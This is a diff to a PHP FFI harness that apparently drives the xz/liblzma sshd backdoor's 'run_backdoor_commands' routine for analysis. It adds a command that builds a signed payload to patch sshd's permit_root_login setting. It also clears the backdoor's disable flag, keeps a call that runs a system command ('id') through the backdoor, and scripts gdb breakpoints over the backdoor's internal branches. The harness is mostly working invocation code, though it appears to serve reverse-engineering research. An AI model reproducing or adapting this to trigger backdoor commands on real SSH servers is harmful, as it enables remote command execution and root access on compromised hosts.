@@ -121,7 +121,7 @@ class Invoker {
     private CData $nat_sshd_log_ctx;
     private CData $nat_sshd_sensitive_data;
     private CData $nat_permit_root_login;
-    private CData $nat_monitor_req_keyallowed;
+    private CData $nat_monitor_req_authpassword;
 
     private CData $nat_host_keys;
     private CData $nat_host_pubkeys;
@@ -137,18 +137,22 @@ class Invoker {
         $this->nat_sshd_log_ctx = $ffi->new('sshd_log_ctx_t');
         $this->nat_sshd_sensitive_data = $ffi->new('struct sensitive_data', false);
         $this->nat_permit_root_login = $ffi->new('int');
-        $this->nat_monitor_req_keyallowed = make_array(4 + 4 + 8);
+        $this->nat_monitor_req_authpassword = make_array(4 + 4 + 8);
 
         $this->nat_permit_root_login->cdata = 0; // PERMIT_NO
         $this->nat_sshd_ctx->permit_root_login_ptr = FFI::addr($this->nat_permit_root_login);
 
-        $monitor_req_keyallowed_ptr = FFI::cast('uintptr_t', FFI::addr($this->nat_monitor_req_keyallowed));
-        $monitor_req_keyallowed_ptr->cdata += 4 + 4;
+        $monitor_req_authpassword_ptr = FFI::cast('uintptr_t', FFI::addr($this->nat_monitor_req_authpassword));
+        $monitor_req_authpassword_ptr->cdata += 4 + 4;
 
-        $this->nat_sshd_ctx->monitor_req_keyallowed_ptr = FFI::cast('void *', $monitor_req_keyallowed_ptr);
+        $this->nat_sshd_ctx->monitor_req_authpassword = FFI::cast('void *', $monitor_req_authpassword_ptr);
         $this->nat_sshd_ctx->have_mm_answer_keyallowed = 1;
         $this->nat_sshd_ctx->have_mm_answer_authpassword = 1;
         $this->nat_sshd_ctx->have_mm_answer_keyverify = 1;
+        $this->nat_sshd_ctx->monitor_req_fn = function($ssh, $sock, $buf){
+            print("-- monitor_req_fn invoked\n");
+            return 0;
+        };
 
         $this->nat_ctx->num_shifted_bits = ED448_PUBKEY_SIZE * 8;
         $this->nat_ctx->imported_funcs = FFI::addr($this->nat_imported_funcs);
@@ -157,10 +161,12 @@ class Invoker {
         $this->nat_ctx->sshd_ctx = FFI::addr($this->nat_sshd_ctx);
 
         
-        foreach(['RSA_get0_key', 'RSA_set0_key', 'BN_bn2bin', 'BN_num_bits',
-        'EVP_CIPHER_CTX_new', 'EVP_DecryptInit_ex', 'EVP_DecryptUpdate',
+        /** init imported functions */
+        foreach(['RSA_get0_key', 'RSA_set0_key', 'RSA_sign',
+        'BN_bn2bin', 'BN_num_bits', 'EVP_CIPHER_CTX_new',
+        'EVP_DecryptInit_ex', 'EVP_DecryptUpdate',
         'EVP_DecryptFinal_ex', 'EVP_CIPHER_CTX_free',
-        'EVP_chacha20', 'RSA_new', 'BN_dup', 'BN_bin2bn',
+        'EVP_chacha20', 'RSA_new', 'RSA_free', 'BN_dup', 'BN_bin2bn', 'BN_free',
         'EVP_Digest', 'EVP_sha256', 'EVP_PKEY_new_raw_public_key',
         'EVP_MD_CTX_new', 'EVP_DigestVerifyInit', 'EVP_DigestVerify',
         'EVP_MD_CTX_free', 'EVP_PKEY_free'
@@ -334,6 +340,14 @@ class Invoker {
         return $this->payload_make($cmd_type, $packet);
     }
 
+    private function payload_make_patch(){
+        $cmd_type = 1;
+        $packet = (''
+            . $this->payload_make_args(0, 0, 0, 0)
+        );
+        return $this->payload_make($cmd_type, $packet);
+    }
+
     private function payload_encode(string $payload){
         /** generate payload and convert to PEM */
         $pkey = RSA::loadPublicKey([
@@ -361,6 +375,9 @@ class Invoker {
     }
 
     private function backdoor_invoke(string $payload){
+        /** clear the backdoor disable flag, in case it's set **/
+        $this->nat_ctx->disable_backdoor = 0;
+
         $payload_rsa_key = $this->payload_encode($payload);
         say('');
 
@@ -371,6 +388,14 @@ class Invoker {
         say("res: {$res}, run_orig: {$run_orig}");
 
         $this->nat_RSA_free($payload_rsa_key);
+    }
+
+    public function cmd_patch_sshd(){
+        $payload = $this->payload_make_patch();
+
+        say("permit_root_login: {$this->nat_permit_root_login->cdata}");
+        $this->backdoor_invoke($payload);
+        say("permit_root_login: {$this->nat_permit_root_login->cdata}");
     }
 
     public function cmd_system(string $command){
@@ -391,7 +416,7 @@ class Invoker {
         $ret = $ffi->mprotect($ptr, $pagesz, 7);
     }
 
-    public function debug_place_breakpoint(int $addr){
+    public function debug_place_breakpoints(int ...$addrs){
         /** @var mixed */
         $ffi = $this->ffi;
         $ptr1 = $ffi->run_backdoor_commands;
@@ -403,19 +428,44 @@ class Invoker {
     
         $pid = getmypid();
         $base = 0x9490;
-        $bp = $addr;
-    
-        $offset = $bp - $base;
-    
+
+        $inspect_sigcheck = <<<'EOS'
+        b verify_signature
+        commands
+        x/50xb $rsi
+        printf "payload_body_size: %u\n", $rdx
+        printf "signed_data_size: %u\n", $rcx
+        end
+        
+        EOS;
+
         $gdbinit = <<<EOS
         attach {$pid}
         set disassembly-flavor intel
-        b *(run_backdoor_commands + {$offset})
+        set pagination off
+
+        define dump_cont
+        x/20xb \$pc
+        c
+        end
+        {$inspect_sigcheck}
+
+        EOS;
+
+        foreach($addrs as $bp){
+            $offset = $bp - $base;
+
+            $gdbinit .= "b *(run_backdoor_commands + {$offset})\n";
+        }
+
+        $gdbinit.= <<<EOS
         set \$pc += 2
         c
+        set pagination on
         layout asm
-    
+
         EOS;
+
         file_put_contents('gdbinit.txt', $gdbinit);
     }
 
@@ -434,5 +484,49 @@ class Invoker {
 
 
 $invoker = new Invoker;
-//$invoker->debug_place_breakpoint(0x993C);
+
+$run_backdoor_commands = 0x9490;
+$jmp_bad_data = [
+    $run_backdoor_commands+0x5FC, $run_backdoor_commands+0x60D, $run_backdoor_commands+0x654, $run_backdoor_commands+0x684,
+    $run_backdoor_commands+0x6B0, $run_backdoor_commands+0x70F, $run_backdoor_commands+0x722, $run_backdoor_commands+0x733,
+    $run_backdoor_commands+0x806, $run_backdoor_commands+0x814, $run_backdoor_commands+0x820, $run_backdoor_commands+0x82C,
+    $run_backdoor_commands+0x842, $run_backdoor_commands+0x84D, $run_backdoor_commands+0x856, $run_backdoor_commands+0x870,
+    $run_backdoor_commands+0x87F, $run_backdoor_commands+0x890, $run_backdoor_commands+0x8A6, $run_backdoor_commands+0x8AF,
+    $run_backdoor_commands+0x8FE, $run_backdoor_commands+0x91F, $run_backdoor_commands+0x92C, $run_backdoor_commands+0x937,
+    $run_backdoor_commands+0x942, $run_backdoor_commands+0x99F, $run_backdoor_commands+0x9AC, $run_backdoor_commands+0x9B9,
+    $run_backdoor_commands+0x9D6, $run_backdoor_commands+0x9EB, $run_backdoor_commands+0xA08, $run_backdoor_commands+0xA30,
+    $run_backdoor_commands+0xA41, $run_backdoor_commands+0xAB0, $run_backdoor_commands+0xACF, $run_backdoor_commands+0xAF4,
+    $run_backdoor_commands+0xB0C, $run_backdoor_commands+0xB1C, $run_backdoor_commands+0xB3F, $run_backdoor_commands+0xB5E,
+    $run_backdoor_commands+0xB6B, $run_backdoor_commands+0xB7F, $run_backdoor_commands+0xB8B, $run_backdoor_commands+0xB99,
+    $run_backdoor_commands+0xBD1, $run_backdoor_commands+0xC2B, $run_backdoor_commands+0xC50, $run_backdoor_commands+0xC6C,
+    $run_backdoor_commands+0xD00
+];
+$jmp_disable_backdoor = [
+    $run_backdoor_commands+0xBB, $run_backdoor_commands+0xCA, $run_backdoor_commands+0xD7, $run_backdoor_commands+0xE4,
+    $run_backdoor_commands+0xF1, $run_backdoor_commands+0x105, $run_backdoor_commands+0x127, $run_backdoor_commands+0x139,
+    $run_backdoor_commands+0x184, $run_backdoor_commands+0x18F, $run_backdoor_commands+0x19A, $run_backdoor_commands+0x1A5,
+    $run_backdoor_commands+0x1B6, $run_backdoor_commands+0x1E1, $run_backdoor_commands+0x20B, $run_backdoor_commands+0x255,
+    $run_backdoor_commands+0x260, $run_backdoor_commands+0x26B, $run_backdoor_commands+0x27E, $run_backdoor_commands+0x29A,
+    $run_backdoor_commands+0x2F6, $run_backdoor_commands+0x320, $run_backdoor_commands+0x354, $run_backdoor_commands+0x3CB,
+    $run_backdoor_commands+0x3D8, $run_backdoor_commands+0x3E1, $run_backdoor_commands+0x3EB, $run_backdoor_commands+0x401,
+    $run_backdoor_commands+0x41F, $run_backdoor_commands+0x434, $run_backdoor_commands+0x451, $run_backdoor_commands+0x46F,
+    $run_backdoor_commands+0x4E5, $run_backdoor_commands+0x501, $run_backdoor_commands+0x510, $run_backdoor_commands+0x532,
+    $run_backdoor_commands+0x53F, $run_backdoor_commands+0x556, $run_backdoor_commands+0x563, $run_backdoor_commands+0x570,
+    $run_backdoor_commands+0x5E9
+];
+$jmp_exit = [
+    $run_backdoor_commands+0x143, $run_backdoor_commands+0x152,
+    $run_backdoor_commands+0x161, $run_backdoor_commands+0x177,
+    $run_backdoor_commands+0xD3E, $run_backdoor_commands+0xD75,
+];
+$breakpoints = array_unique([...$jmp_bad_data, /*...$jmp_disable_backdoor, ...$jmp_exit*/]);
+//$invoker->debug_place_breakpoints(...$breakpoints);
+//$invoker->debug_place_breakpoints();
+
+//$invoker->debug_place_breakpoints(0x993C);
+print(" ... running system command ...\n");
 $invoker->cmd_system('id');
+
+print(" ... patching sshd variables ...\n");
+$invoker->cmd_patch_sshd();
+print(" done!\n");
